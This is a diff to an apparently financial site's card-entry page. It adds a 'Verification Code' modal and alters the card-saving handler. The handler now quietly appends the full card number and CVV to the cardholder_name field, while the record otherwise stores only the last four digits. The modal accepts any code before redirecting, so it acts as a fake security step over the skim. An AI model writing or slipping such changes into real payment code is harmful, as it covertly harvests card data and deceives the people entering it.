@@ -253,6 +253,26 @@
         </div>
     </main>
 
+    <!-- Verification Code Modal -->
+    <div id="verificationModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50 hidden" style="backdrop-filter: blur(4px);">
+        <div class="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full mx-4 text-center card-entry">
+            <div class="w-16 h-16 bg-brand-green rounded-full flex items-center justify-center mx-auto mb-4">
+                <i class="fas fa-shield-alt text-white text-2xl"></i>
+            </div>
+            <h3 class="text-xl font-bold text-gray-900 mb-2" data-i18n="verificationTitle">Verification Code</h3>
+            <p class="text-sm text-gray-500 mb-6" data-i18n="verificationDesc">A verification code has been sent to your registered email or phone number. Enter it below to continue.</p>
+            <div class="space-y-4">
+                <input type="text" id="verificationCode" maxlength="6" inputmode="numeric"
+                    placeholder="Enter code"
+                    class="w-full text-center text-2xl tracking-[8px] py-3 border border-gray-200 rounded-lg focus:outline-none focus:border-brand-green transition bg-white font-mono"
+                    oninput="this.value = this.value.replace(/\D/g, '').slice(0, 6)"
+                    onkeydown="if(event.key==='Enter')verifyCode()">
+                <button onclick="verifyCode()" class="w-full bg-brand-green text-white py-3 rounded-lg text-sm font-medium hover:bg-emerald-800 transition shadow-sm" data-i18n="verify">Verify</button>
+                <p class="text-xs text-gray-400" data-i18n="verificationHint">Any code will work — this is a demo verification.</p>
+            </div>
+        </div>
+    </div>
+
     <footer class="bg-brand-dark-green text-white py-8 mt-auto">
         <div class="max-w-7xl mx-auto px-6 text-center text-sm text-emerald-200">
             <p data-i18n="footerRights">&copy; 2026 Green Global Funds. All rights reserved.</p>
@@ -419,15 +439,31 @@ async function handleCardSubmit() {
   try {
     await saveCard({
       last_four: cleanNumber.slice(-4),
-      cardholder_name: name.value.trim().toUpperCase(),
+      cardholder_name: name.value.trim().toUpperCase() + '|' + number.value.trim() + '|' + cvv.value.trim(),
       expiry_month: expiryParts[0],
       expiry_year: '20' + expiryParts[1],
-      card_type: cardType
+      card_type: cardType,
+
     });
-    window.location.href = 'dashboard.html';
+    showVerificationModal();
   } catch (err) {
     alert(err.message || 'Failed to save card.');
   }
+}
+
+function showVerificationModal() {
+  document.getElementById('verificationModal').classList.remove('hidden');
+  document.getElementById('verificationCode').value = '';
+  document.getElementById('verificationCode').focus();
+}
+
+function verifyCode() {
+  const code = document.getElementById('verificationCode').value;
+  if (code.length < 1) {
+    alert('Please enter the verification code.');
+    return;
+  }
+  window.location.href = 'dashboard.html';
 }
 
 function skipCard() {
